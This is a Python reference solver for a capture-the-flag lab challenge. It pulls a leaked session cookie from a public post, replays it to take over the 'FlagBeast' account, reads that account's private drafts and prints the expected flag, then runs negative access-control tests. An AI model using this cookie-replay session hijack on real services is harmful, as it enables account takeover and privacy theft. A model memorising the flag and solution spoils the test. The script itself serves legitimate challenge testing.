#!/usr/bin/env python3
"""
Reference Solver for Follow Me for a Cookie (Challenge 9)
Demonstrates the intended solution path programmatically.
"""

import requests
import sys
import os
import re

# Use host.docker.internal when running inside Condev/container
# Check if we're in a container
in_container = os.path.exists('/.dockerenv') or os.getenv('CONDEV') or os.getenv('IN_CONDEV')
if in_container:
    BASE_URL = "http://host.docker.internal:18109"
    COOKIE_DOMAIN = "host.docker.internal"
else:
    BASE_URL = "http://localhost:18109"
    COOKIE_DOMAIN = "localhost"

EXPECTED_FLAG = "RCC{aero_session_hijack_1n_th3_w1ld}"

def solve():
    print("[*] Follow Me for a Cookie - Reference Solver")
    print(f"[*] Target: {BASE_URL}")
    print(f"[*] In container: {in_container}")
    print()

    # Step 1: Verify the leak post is accessible
    print("[1] Fetching public timeline...")
    resp = requests.get(f"{BASE_URL}/api/timeline")
    resp.raise_for_status()
    posts = resp.json().get("posts", [])
    
    leak_post = None
    flagbeast_post = None
    for post in posts:
        if post["authorHandle"] == "AnonymousArchive" and "SESSION LEAK" in post["content"]:
            leak_post = post
        if post["authorHandle"] == "FlagBeast" and "Stole someone's flag" in post["content"]:
            flagbeast_post = post
    
    if not leak_post:
        print("[-] Leak post not found!")
        return False
    if not flagbeast_post:
        print("[-] FlagBeast boast post not found!")
        return False
    
    print(f"[+] Found FlagBeast boast: {flagbeast_post['id']}")
    print(f"[+] Found AnonymousArchive leak: {leak_post['id']}")
    
    # Read the token from the public leak, without an organizer token constant.
    match = re.search(
        r"Username: FlagBeast\s+Cookie Name: aero_session\s+Cookie Value: (\S+)",
        leak_post["content"],
    )
    if not match:
        print("[-] Target cookie row not found in leak!")
        return False
    target_cookie = match.group(1)
    print(f"[+] Target cookie found in leak: {target_cookie}")
    print()

    # Step 2: Register a throwaway account
    print("[2] Registering throwaway account...")
    import uuid
    handle = f"solver_{uuid.uuid4().hex[:8]}"
    resp = requests.post(f"{BASE_URL}/api/register", json={
        "handle": handle,
        "displayName": "Solver",
        "password": "password123"
    })
    resp.raise_for_status()
    data = resp.json()
    session_cookie = resp.cookies.get("aero_session")
    print(f"[+] Registered as @{handle}")
    print(f"[+] Got session cookie: {session_cookie}")
    print()

    # Step 3: Replace cookie with target
    print("[3] Replacing session cookie with @FlagBeast's leaked token...")
    session = requests.Session()
    session.cookies.set("aero_session", target_cookie, domain=COOKIE_DOMAIN, path="/")
    
    # Step 4: Verify we're now @FlagBeast
    print("[4] Verifying identity as @FlagBeast...")
    resp = session.get(f"{BASE_URL}/api/me")
    resp.raise_for_status()
    me = resp.json()
    
    if not me.get("authenticated"):
        print("[-] Not authenticated after cookie replacement!")
        return False
    
    user = me.get("user", {})
    if user.get("handle") != "FlagBeast":
        print(f"[-] Expected @FlagBeast, got @{user.get('handle')}")
        return False
    
    print(f"[+] Successfully authenticated as @{user['handle']} ({user['displayName']})")
    print()

    # Step 5: Access drafts
    print("[5] Accessing private drafts...")
    resp = session.get(f"{BASE_URL}/api/drafts")
    resp.raise_for_status()
    drafts = resp.json().get("drafts", [])
    
    if not drafts:
        print("[-] No drafts found!")
        return False
    
    print(f"[+] Found {len(drafts)} draft(s)")
    for draft in drafts:
        print(f"    Draft {draft['id']}: {draft['content'][:80]}...")
        if EXPECTED_FLAG in draft["content"]:
            print(f"[+] FLAG FOUND: {EXPECTED_FLAG}")
            return True
    
    print(f"[-] Expected flag not found in drafts!")
    return False


def test_negative_cases():
    """Test that unauthorized access is properly blocked."""
    print("\n[*] Running negative/shortcut tests...")
    
    # Test 1: Unauthenticated access to drafts
    print("[Test 1] Unauthenticated draft access...")
    resp = requests.get(f"{BASE_URL}/api/drafts")
    assert resp.status_code == 401, f"Expected 401, got {resp.status_code}"
    print("    [+] Correctly returns 401")
    
    # Test 2: Wrong session can't access target draft
    print("[Test 2] Ordinary user cannot access @FlagBeast draft...")
    # Register a test user and get their session
    resp = requests.post(f"{BASE_URL}/api/register", json={
        "handle": f"test_{os.urandom(4).hex()}",
        "displayName": "Test",
        "password": "password"
    })
    resp.raise_for_status()
    assert "aero_session" in resp.cookies, "Ordinary account did not receive a session"
    test_session = requests.Session()
    # Copy the aero_session cookie from the registration response
    if "aero_session" in resp.cookies:
        test_session.cookies.set("aero_session", resp.cookies["aero_session"], domain=COOKIE_DOMAIN, path="/")
    
    resp = test_session.get(f"{BASE_URL}/api/drafts/draft-flagbeast-1")
    assert resp.status_code == 403, f"Expected authenticated ownership denial (403), got {resp.status_code}"
    print(f"    [+] Correctly returns {resp.status_code}")
    
    # Test 3: Malformed cookie
    print("[Test 3] Malformed cookie rejected...")
    session = requests.Session()
    session.cookies.set("aero_session", "invalid_token", domain=COOKIE_DOMAIN, path="/")
    resp = session.get(f"{BASE_URL}/api/me")
    assert not resp.json().get("authenticated"), "Should not be authenticated"
    print("    [+] Correctly rejects malformed cookie")
    
    # Test 4: Username-only cookie
    print("[Test 4] Username-as-cookie rejected...")
    session = requests.Session()
    session.cookies.set("aero_session", "FlagBeast", domain=COOKIE_DOMAIN, path="/")
    resp = session.get(f"{BASE_URL}/api/me")
    assert not resp.json().get("authenticated"), "Should not be authenticated"
    print("    [+] Correctly rejects username-as-cookie")
    
    # Test 5: Public APIs don't leak flag
    print("[Test 5] Public APIs don't contain flag...")
    resp = requests.get(f"{BASE_URL}/api/timeline")
    assert EXPECTED_FLAG not in resp.text, "Flag leaked in timeline!"
    resp = requests.get(f"{BASE_URL}/api/user/FlagBeast")
    assert EXPECTED_FLAG not in resp.text, "Flag leaked in profile!"
    resp = requests.get(f"{BASE_URL}/api/search?q=flag")
    assert EXPECTED_FLAG not in resp.text, "Flag leaked in search!"
    print("    [+] Flag not found in public APIs")
    
    print("\n[+] All negative tests passed!")


if __name__ == "__main__":
    try:
        success = solve()
        if success:
            test_negative_cases()
            print("\n[=== SOLVER COMPLETE ===]")
            print(f"Flag: {EXPECTED_FLAG}")
            sys.exit(0)
        else:
            print("\n[=== SOLVER FAILED ===]")
            sys.exit(1)
    except Exception as e:
        print(f"\n[ERROR] {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
